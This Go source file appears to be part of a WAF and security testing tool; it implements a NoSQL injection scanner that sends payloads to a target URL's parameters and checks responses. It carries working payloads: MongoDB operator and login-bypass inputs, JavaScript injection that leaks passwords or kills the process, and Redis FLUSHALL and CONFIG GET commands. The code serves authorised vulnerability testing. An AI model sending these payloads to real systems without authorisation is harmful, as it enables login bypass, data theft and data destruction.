// Package nosqli provides NoSQL injection detection capabilities.
// It tests for MongoDB, CouchDB, Redis, and other NoSQL database injection
// vulnerabilities including operator injection, JavaScript injection, and
// authentication bypass.
package nosqli

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"

	"github.com/waftester/waftester/pkg/defaults"
	"github.com/waftester/waftester/pkg/duration"
	"github.com/waftester/waftester/pkg/httpclient"
	"github.com/waftester/waftester/pkg/iohelper"
	"github.com/waftester/waftester/pkg/ui"
)

// VulnerabilityType represents the type of NoSQL injection vulnerability
type VulnerabilityType string

const (
	VulnOperatorInjection VulnerabilityType = "operator-injection"
	VulnJSInjection       VulnerabilityType = "javascript-injection"
	VulnAuthBypass        VulnerabilityType = "authentication-bypass"
	VulnDataExfiltration  VulnerabilityType = "data-exfiltration"
	VulnBlindInjection    VulnerabilityType = "blind-nosql-injection"
	VulnArrayInjection    VulnerabilityType = "array-injection"
)

// Database represents the target NoSQL database type
type Database string

const (
	DBMongoDB  Database = "mongodb"
	DBCouchDB  Database = "couchdb"
	DBRedis    Database = "redis"
	DBFirebase Database = "firebase"
	DBUnknown  Database = "unknown"
)

// Severity levels for vulnerabilities
type Severity string

const (
	SeverityCritical Severity = "critical"
	SeverityHigh     Severity = "high"
	SeverityMedium   Severity = "medium"
	SeverityLow      Severity = "low"
	SeverityInfo     Severity = "info"
)

// Vulnerability represents a detected NoSQL injection vulnerability
type Vulnerability struct {
	Type        VulnerabilityType `json:"type"`
	Description string            `json:"description"`
	Severity    Severity          `json:"severity"`
	URL         string            `json:"url"`
	Parameter   string            `json:"parameter,omitempty"`
	Payload     string            `json:"payload"`
	Evidence    string            `json:"evidence"`
	Database    Database          `json:"database"`
	Remediation string            `json:"remediation"`
	CVSS        float64           `json:"cvss"`
}

// Payload represents a NoSQL injection payload
type Payload struct {
	Value       string
	Description string
	Database    Database
	Type        VulnerabilityType
	ContentType string // json, form, or query
}

// ScanResult contains the results of a NoSQL injection scan
type ScanResult struct {
	URL             string          `json:"url"`
	StartTime       time.Time       `json:"start_time"`
	EndTime         time.Time       `json:"end_time"`
	Duration        time.Duration   `json:"duration"`
	Vulnerabilities []Vulnerability `json:"vulnerabilities"`
	DatabaseHint    Database        `json:"database_hint"`
	TestedPayloads  int             `json:"tested_payloads"`
}

// TesterConfig configures the NoSQL injection tester
type TesterConfig struct {
	Timeout     time.Duration
	UserAgent   string
	Concurrency int
	Database    Database // Target database type
	TestParams  []string // Parameters to test
	Client      *http.Client
}

// Tester performs NoSQL injection tests
type Tester struct {
	config *TesterConfig
	client *http.Client
}

// DefaultConfig returns a default configuration
func DefaultConfig() *TesterConfig {
	return &TesterConfig{
		Timeout:     duration.HTTPFuzzing,
		UserAgent:   ui.UserAgent(),
		Concurrency: defaults.ConcurrencyLow,
		Database:    DBUnknown,
		TestParams: []string{
			"username",
			"password",
			"user",
			"pass",
			"email",
			"login",
			"id",
			"search",
			"query",
			"filter",
			"where",
			"name",
			"data",
		},
	}
}

// NewTester creates a new NoSQL injection tester
func NewTester(config *TesterConfig) *Tester {
	if config == nil {
		config = DefaultConfig()
	}

	client := config.Client
	if client == nil {
		client = httpclient.Default()
	}

	return &Tester{
		config: config,
		client: client,
	}
}

// GetPayloads returns NoSQL injection payloads
func (t *Tester) GetPayloads(db Database) []Payload {
	var payloads []Payload

	// MongoDB operator injection payloads
	mongoPayloads := []Payload{
		// Query selector injection
		{Value: `{"$gt": ""}`, Description: "MongoDB $gt operator", Database: DBMongoDB, Type: VulnOperatorInjection, ContentType: "json"},
		{Value: `{"$ne": null}`, Description: "MongoDB $ne operator", Database: DBMongoDB, Type: VulnOperatorInjection, ContentType: "json"},
		{Value: `{"$ne": ""}`, Description: "MongoDB $ne empty string", Database: DBMongoDB, Type: VulnOperatorInjection, ContentType: "json"},
		{Value: `{"$gt": undefined}`, Description: "MongoDB $gt undefined", Database: DBMongoDB, Type: VulnOperatorInjection, ContentType: "json"},
		{Value: `{"$exists": true}`, Description: "MongoDB $exists operator", Database: DBMongoDB, Type: VulnOperatorInjection, ContentType: "json"},
		{Value: `{"$regex": ".*"}`, Description: "MongoDB $regex any", Database: DBMongoDB, Type: VulnOperatorInjection, ContentType: "json"},
		{Value: `{"$regex": "^a"}`, Description: "MongoDB $regex prefix", Database: DBMongoDB, Type: VulnOperatorInjection, ContentType: "json"},
		{Value: `{"$in": [""]}`, Description: "MongoDB $in operator", Database: DBMongoDB, Type: VulnOperatorInjection, ContentType: "json"},
		{Value: `{"$nin": ["impossible"]}`, Description: "MongoDB $nin operator", Database: DBMongoDB, Type: VulnOperatorInjection, ContentType: "json"},
		{Value: `{"$where": "1==1"}`, Description: "MongoDB $where true", Database: DBMongoDB, Type: VulnJSInjection, ContentType: "json"},
		{Value: `{"$where": "sleep(5000)"}`, Description: "MongoDB $where sleep", Database: DBMongoDB, Type: VulnBlindInjection, ContentType: "json"},

		// URL-encoded operators for query string
		{Value: "[$gt]=", Description: "MongoDB $gt URL param", Database: DBMongoDB, Type: VulnOperatorInjection, ContentType: "query"},
		{Value: "[$ne]=", Description: "MongoDB $ne URL param", Database: DBMongoDB, Type: VulnOperatorInjection, ContentType: "query"},
		{Value: "[$regex]=.*", Description: "MongoDB $regex URL param", Database: DBMongoDB, Type: VulnOperatorInjection, ContentType: "query"},
		{Value: "[$exists]=true", Description: "MongoDB $exists URL param", Database: DBMongoDB, Type: VulnOperatorInjection, ContentType: "query"},

		// JavaScript injection
		{Value: `'; return true; var x='`, Description: "MongoDB JS injection", Database: DBMongoDB, Type: VulnJSInjection, ContentType: "form"},
		{Value: `1'; return this.password; var x='`, Description: "MongoDB data leak", Database: DBMongoDB, Type: VulnDataExfiltration, ContentType: "form"},
		{Value: `this.constructor.constructor("return this")().process.exit()`, Description: "MongoDB RCE attempt", Database: DBMongoDB, Type: VulnJSInjection, ContentType: "json"},

		// Array injection
		{Value: `["$gt", ""]`, Description: "MongoDB array $gt", Database: DBMongoDB, Type: VulnArrayInjection, ContentType: "json"},
	}

	// Authentication bypass payloads
	authBypassPayloads := []Payload{
		// Common auth bypass patterns
		{Value: `{"$gt": ""}`, Description: "Auth bypass via $gt", Database: DBMongoDB, Type: VulnAuthBypass, ContentType: "json"},
		{Value: `{"$ne": ""}`, Description: "Auth bypass via $ne", Database: DBMongoDB, Type: VulnAuthBypass, ContentType: "json"},
		{Value: `{"$regex": ".*"}`, Description: "Auth bypass via regex", Database: DBMongoDB, Type: VulnAuthBypass, ContentType: "json"},
		{Value: `true`, Description: "Boolean true bypass", Database: DBUnknown, Type: VulnAuthBypass, ContentType: "json"},
		{Value: `{"$or": [{"a": "a"}, {"b": "b"}]}`, Description: "MongoDB $or bypass", Database: DBMongoDB, Type: VulnAuthBypass, ContentType: "json"},
	}

	// CouchDB specific payloads
	couchPayloads := []Payload{
		{Value: `"_all_docs"`, Description: "CouchDB all docs", Database: DBCouchDB, Type: VulnDataExfiltration, ContentType: "json"},
		{Value: `{"selector": {"_id": {"$gt": null}}}`, Description: "CouchDB Mango query", Database: DBCouchDB, Type: VulnOperatorInjection, ContentType: "json"},
		{Value: `%00`, Description: "CouchDB null byte", Database: DBCouchDB, Type: VulnOperatorInjection, ContentType: "form"},
	}

	// Redis specific payloads
	redisPayloads := []Payload{
		{Value: `*\r\n$4\r\nINFO\r\n`, Description: "Redis INFO command", Database: DBRedis, Type: VulnJSInjection, ContentType: "form"},
		{Value: `FLUSHALL`, Description: "Redis FLUSHALL", Database: DBRedis, Type: VulnJSInjection, ContentType: "form"},
		{Value: `CONFIG GET *`, Description: "Redis CONFIG GET", Database: DBRedis, Type: VulnDataExfiltration, ContentType: "form"},
	}

	// Filter by database if specified
	if db == DBMongoDB {
		payloads = append(payloads, mongoPayloads...)
		payloads = append(payloads, authBypassPayloads...)
	} else if db == DBCouchDB {
		payloads = append(payloads, couchPayloads...)
	} else if db == DBRedis {
		payloads = append(payloads, redisPayloads...)
	} else {
		// Unknown - include all
		payloads = append(payloads, mongoPayloads...)
		payloads = append(payloads, authBypassPayloads...)
		payloads = append(payloads, couchPayloads...)
		payloads = append(payloads, redisPayloads...)
	}

	return payloads
}

// TestParameter tests a specific parameter for NoSQL injection
func (t *Tester) TestParameter(ctx context.Context, targetURL string, param string, payloads []Payload) ([]Vulnerability, error) {
	var vulns []Vulnerability

	u, err := url.Parse(targetURL)
	if err != nil {
		return nil, err
	}

	for _, payload := range payloads {
		var vuln *Vulnerability

		switch payload.ContentType {
		case "query":
			vuln, err = t.testQueryParam(ctx, u, param, payload)
		case "json":
			vuln, err = t.testJSONBody(ctx, u.String(), param, payload)
		case "form":
			vuln, err = t.testFormBody(ctx, u.String(), param, payload)
		default:
			vuln, err = t.testQueryParam(ctx, u, param, payload)
		}

		if err != nil {
			continue
		}

		if vuln != nil {
			vulns = append(vulns, *vuln)
		}
	}

	return vulns, nil
}

// testQueryParam tests NoSQL injection in query parameters
func (t *Tester) testQueryParam(ctx context.Context, u *url.URL, param string, payload Payload) (*Vulnerability, error) {
	// Clone URL to avoid mutating the shared pointer across loop iterations
	cloned := *u

	// Build URL with injected parameter
	q := cloned.Query()
	q.Set(param+payload.Value, "")
	cloned.RawQuery = q.Encode()
	testURL := cloned.String()

	req, err := http.NewRequestWithContext(ctx, "GET", testURL, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("User-Agent", t.config.UserAgent)

	resp, err := t.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer iohelper.DrainAndClose(resp.Body) // Ensure cleanup even on panic

	body := readBodyLimit(resp, 100*1024)

	// Check for evidence of successful injection
	evidence := t.detectEvidence(body, resp.StatusCode, payload.Database)
	if evidence != "" {
		return &Vulnerability{
			Type:        payload.Type,
			Description: fmt.Sprintf("NoSQL injection via query parameter '%s' using %s", param, payload.Description),
			Severity:    getSeverity(payload.Type),
			URL:         testURL,
			Parameter:   param,
			Payload:     payload.Value,
			Evidence:    evidence,
			Database:    payload.Database,
			Remediation: GetNoSQLiRemediation(),
			CVSS:        getCVSS(payload.Type),
		}, nil
	}

	return nil, nil
}

// testJSONBody tests NoSQL injection in JSON request body
func (t *Tester) testJSONBody(ctx context.Context, targetURL string, param string, payload Payload) (*Vulnerability, error) {
	// Build JSON body with injection
	bodyData := map[string]interface{}{
		param: json.RawMessage(payload.Value),
	}

	bodyBytes, err := json.Marshal(bodyData)
	if err != nil {
		return nil, err
	}

	req, err := http.NewRequestWithContext(ctx, "POST", targetURL, bytes.NewReader(bodyBytes))
	if err != nil {
		return nil, err
	}
	req.Header.Set("User-Agent", t.config.UserAgent)
	req.Header.Set("Content-Type", defaults.ContentTypeJSON)

	resp, err := t.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer iohelper.DrainAndClose(resp.Body)

	body := readBodyLimit(resp, 100*1024)

	evidence := t.detectEvidence(body, resp.StatusCode, payload.Database)
	if evidence != "" {
		return &Vulnerability{
			Type:        payload.Type,
			Description: fmt.Sprintf("NoSQL injection via JSON body parameter '%s' using %s", param, payload.Description),
			Severity:    getSeverity(payload.Type),
			URL:         targetURL,
			Parameter:   param,
			Payload:     payload.Value,
			Evidence:    evidence,
			Database:    payload.Database,
			Remediation: GetNoSQLiRemediation(),
			CVSS:        getCVSS(payload.Type),
		}, nil
	}

	return nil, nil
}

// testFormBody tests NoSQL injection in form request body
func (t *Tester) testFormBody(ctx context.Context, targetURL string, param string, payload Payload) (*Vulnerability, error) {
	formData := url.Values{}
	formData.Set(param, payload.Value)

	req, err := http.NewRequestWithContext(ctx, "POST", targetURL, strings.NewReader(formData.Encode()))
	if err != nil {
		return nil, err
	}
	req.Header.Set("User-Agent", t.config.UserAgent)
	req.Header.Set("Content-Type", defaults.ContentTypeForm)

	resp, err := t.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer iohelper.DrainAndClose(resp.Body)

	body := readBodyLimit(resp, 100*1024)

	evidence := t.detectEvidence(body, resp.StatusCode, payload.Database)
	if evidence != "" {
		return &Vulnerability{
			Type:        payload.Type,
			Description: fmt.Sprintf("NoSQL injection via form parameter '%s' using %s", param, payload.Description),
			Severity:    getSeverity(payload.Type),
			URL:         targetURL,
			Parameter:   param,
			Payload:     payload.Value,
			Evidence:    evidence,
			Database:    payload.Database,
			Remediation: GetNoSQLiRemediation(),
			CVSS:        getCVSS(payload.Type),
		}, nil
	}

	return nil, nil
}

// detectEvidence checks response for signs of NoSQL injection
func (t *Tester) detectEvidence(body string, statusCode int, db Database) string {
	// MongoDB error patterns
	mongoPatterns := []*regexp.Regexp{
		regexp.MustCompile(`(?i)MongoError`),
		regexp.MustCompile(`(?i)MongoDB`),
		regexp.MustCompile(`(?i)\$where.*not allowed`),
		regexp.MustCompile(`(?i)BSONObj.*`),
		regexp.MustCompile(`(?i)cannot.*query.*operator`),
		regexp.MustCompile(`(?i)bad.*query.*selector`),
		regexp.MustCompile(`(?i)ObjectId\(`),
		regexp.MustCompile(`(?i)_id.*ObjectId`),
		regexp.MustCompile(`(?i)operator.*not.*supported`),
	}

	// CouchDB error patterns
	couchPatterns := []*regexp.Regexp{
		regexp.MustCompile(`(?i)CouchDB`),
		regexp.MustCompile(`(?i)couchdb\.org`),
		regexp.MustCompile(`(?i)"error":\s*"not_found"`),
		regexp.MustCompile(`(?i)_design/`),
		regexp.MustCompile(`(?i)"views":`),
	}

	// Redis error patterns
	redisPatterns := []*regexp.Regexp{
		regexp.MustCompile(`(?i)REDIS`),
		regexp.MustCompile(`(?i)redis_version`),
		regexp.MustCompile(`(?i)ERR.*wrong.*number.*arguments`),
		regexp.MustCompile(`(?i)WRONGTYPE`),
	}

	// Generic NoSQL patterns
	genericPatterns := []*regexp.Regexp{
		regexp.MustCompile(`(?i)Query.*error`),
		regexp.MustCompile(`(?i)SyntaxError.*JSON`),
		regexp.MustCompile(`(?i)unexpected.*token`),
		regexp.MustCompile(`(?i)invalid.*operator`),
	}

	// Check based on database type
	patterns := genericPatterns
	if db == DBMongoDB || db == DBUnknown {
		patterns = append(patterns, mongoPatterns...)
	}
	if db == DBCouchDB || db == DBUnknown {
		patterns = append(patterns, couchPatterns...)
	}
	if db == DBRedis || db == DBUnknown {
		patterns = append(patterns, redisPatterns...)
	}

	for _, p := range patterns {
		if match := p.FindString(body); match != "" {
			return fmt.Sprintf("Pattern matched: %s", truncate(match, 100))
		}
	}

	// Check for successful auth bypass (e.g., unexpected 200 on login)
	if statusCode == 200 && (strings.Contains(body, "welcome") ||
		strings.Contains(body, "dashboard") ||
		strings.Contains(body, "logout") ||
		strings.Contains(body, "session")) {
		return "Possible auth bypass: successful login indicators found"
	}

	return ""
}

// DetectDatabase attempts to detect the NoSQL database type
func (t *Tester) DetectDatabase(ctx context.Context, targetURL string) (Database, error) {
	req, err := http.NewRequestWithContext(ctx, "GET", targetURL, nil)
	if err != nil {
		return DBUnknown, err
	}
	req.Header.Set("User-Agent", t.config.UserAgent)

	resp, err := t.client.Do(req)
	if err != nil {
		return DBUnknown, err
	}
	defer iohelper.DrainAndClose(resp.Body)

	body := readBodyLimit(resp, 50*1024)

	// Check response headers
	server := resp.Header.Get("Server")
	xPowered := resp.Header.Get("X-Powered-By")

	if strings.Contains(strings.ToLower(server), "couchdb") {
		return DBCouchDB, nil
	}

	// Check body for hints
	if strings.Contains(body, "MongoDB") || strings.Contains(body, "MongoClient") {
		return DBMongoDB, nil
	}
	if strings.Contains(body, "CouchDB") || strings.Contains(body, "_design/") {
		return DBCouchDB, nil
	}
	if strings.Contains(body, "redis") || strings.Contains(body, "REDIS") {
		return DBRedis, nil
	}

	// Check for common MongoDB ODM hints
	if strings.Contains(xPowered, "Express") || strings.Contains(xPowered, "Node") {
		// Express/Node often uses MongoDB
		return DBMongoDB, nil
	}

	return DBUnknown, nil
}

// Scan performs a comprehensive NoSQL injection scan
func (t *Tester) Scan(ctx context.Context, targetURL string) (*ScanResult, error) {
	startTime := time.Now()
	result := &ScanResult{
		URL:       targetURL,
		StartTime: startTime,
	}

	// Detect database type
	db, _ := t.DetectDatabase(ctx, targetURL)
	if t.config.Database != DBUnknown {
		db = t.config.Database
	}
	result.DatabaseHint = db

	// Get payloads
	payloads := t.GetPayloads(db)
	result.TestedPayloads = len(payloads)

	// Test each parameter
	for _, param := range t.config.TestParams {
		vulns, err := t.TestParameter(ctx, targetURL, param, payloads)
		if err != nil {
			continue
		}
		result.Vulnerabilities = append(result.Vulnerabilities, vulns...)
	}

	result.EndTime = time.Now()
	result.Duration = result.EndTime.Sub(startTime)

	return result, nil
}

// Helper functions

func readBodyLimit(resp *http.Response, limit int64) string {
	data, _ := io.ReadAll(io.LimitReader(resp.Body, limit))
	return string(data)
}

func truncate(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen] + "..."
}

func getSeverity(vulnType VulnerabilityType) Severity {
	switch vulnType {
	case VulnAuthBypass, VulnDataExfiltration:
		return SeverityCritical
	case VulnOperatorInjection, VulnJSInjection:
		return SeverityHigh
	case VulnBlindInjection:
		return SeverityMedium
	default:
		return SeverityHigh
	}
}

func getCVSS(vulnType VulnerabilityType) float64 {
	switch vulnType {
	case VulnAuthBypass:
		return 9.8
	case VulnDataExfiltration:
		return 8.6
	case VulnJSInjection:
		return 8.1
	case VulnOperatorInjection:
		return 7.5
	case VulnBlindInjection:
		return 6.5
	default:
		return 7.5
	}
}

// Remediation guidance

// GetNoSQLiRemediation returns remediation for NoSQL injection
func GetNoSQLiRemediation() string {
	return `To fix NoSQL injection vulnerabilities:
1. Validate and sanitize all user input before using in queries
2. Use parameterized queries or ODM methods that escape input
3. Disable JavaScript execution in database ($where, mapReduce, group)
4. Implement strict input validation with allowlists
5. Use type checking to ensure expected data types
6. Avoid constructing queries from string concatenation
7. Apply the principle of least privilege to database users
8. Monitor and log suspicious query patterns`
}

// GetMongoDBRemediation returns specific remediation for MongoDB
func GetMongoDBRemediation() string {
	return `MongoDB-specific protections:
1. Disable $where operator or restrict its use
2. Use MongoDB's built-in BSON type checking
3. Implement schema validation in collections
4. Use Mongoose or similar ODM with sanitization
5. Enable authentication and authorization
6. Configure mongod with security.javascriptEnabled: false`
}

// AllVulnerabilityTypes returns all NoSQL injection vulnerability types
func AllVulnerabilityTypes() []VulnerabilityType {
	return []VulnerabilityType{
		VulnOperatorInjection,
		VulnJSInjection,
		VulnAuthBypass,
		VulnDataExfiltration,
		VulnBlindInjection,
		VulnArrayInjection,
	}
}

// AllDatabases returns all supported NoSQL database types
func AllDatabases() []Database {
	return []Database{
		DBMongoDB,
		DBCouchDB,
		DBRedis,
		DBFirebase,
	}
}

// GenerateAuthBypassPayloads generates authentication bypass payloads
func GenerateAuthBypassPayloads() []Payload {
	return []Payload{
		{Value: `{"$gt": ""}`, Description: "Greater than empty", Database: DBMongoDB, Type: VulnAuthBypass},
		{Value: `{"$ne": null}`, Description: "Not equal null", Database: DBMongoDB, Type: VulnAuthBypass},
		{Value: `{"$exists": true}`, Description: "Field exists", Database: DBMongoDB, Type: VulnAuthBypass},
		{Value: `{"$regex": ".*"}`, Description: "Match any", Database: DBMongoDB, Type: VulnAuthBypass},
		{Value: `true`, Description: "Boolean true", Database: DBUnknown, Type: VulnAuthBypass},
		{Value: `1`, Description: "Truthy integer", Database: DBUnknown, Type: VulnAuthBypass},
	}
}

// GenerateOperatorPayloads generates operator injection payloads
func GenerateOperatorPayloads() []Payload {
	return []Payload{
		{Value: `{"$gt": ""}`, Description: "Greater than", Database: DBMongoDB, Type: VulnOperatorInjection},
		{Value: `{"$lt": "z"}`, Description: "Less than", Database: DBMongoDB, Type: VulnOperatorInjection},
		{Value: `{"$gte": ""}`, Description: "Greater than or equal", Database: DBMongoDB, Type: VulnOperatorInjection},
		{Value: `{"$lte": "z"}`, Description: "Less than or equal", Database: DBMongoDB, Type: VulnOperatorInjection},
		{Value: `{"$ne": "x"}`, Description: "Not equal", Database: DBMongoDB, Type: VulnOperatorInjection},
		{Value: `{"$in": ["", "a"]}`, Description: "In array", Database: DBMongoDB, Type: VulnOperatorInjection},
		{Value: `{"$nin": ["x"]}`, Description: "Not in array", Database: DBMongoDB, Type: VulnOperatorInjection},
		{Value: `{"$or": [{}, {}]}`, Description: "Or operator", Database: DBMongoDB, Type: VulnOperatorInjection},
		{Value: `{"$and": [{}, {}]}`, Description: "And operator", Database: DBMongoDB, Type: VulnOperatorInjection},
	}
}

// IsNoSQLOperator checks if a string contains NoSQL operators
func IsNoSQLOperator(input string) bool {
	operators := []string{
		"$gt", "$lt", "$gte", "$lte", "$ne", "$eq",
		"$in", "$nin", "$or", "$and", "$not", "$nor",
		"$exists", "$type", "$regex", "$where",
		"$mod", "$all", "$size", "$elemMatch",
	}

	lower := strings.ToLower(input)
	for _, op := range operators {
		if strings.Contains(lower, op) {
			return true
		}
	}

	return false
}

// SanitizeForMongoDB sanitizes input for safe MongoDB queries
func SanitizeForMongoDB(input string) string {
	// Remove or escape dangerous characters and operators
	dangerous := []string{"$", "{", "}", "[", "]", "'", "\"", ";", "\\"}
	result := input

	for _, char := range dangerous {
		result = strings.ReplaceAll(result, char, "")
	}

	return result
}
